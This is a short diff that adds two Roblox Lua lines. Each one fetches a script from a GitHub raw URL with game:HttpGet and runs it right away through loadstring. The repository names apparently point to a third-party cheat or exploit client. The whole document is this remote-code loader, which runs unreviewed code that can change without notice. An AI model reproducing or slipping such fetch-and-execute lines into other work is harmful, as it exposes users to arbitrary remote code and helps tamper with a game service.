@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vodxn/sape/main/Initiate.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hshshahshsh/test-custom-vape/main/chat%20tags.lua"))()
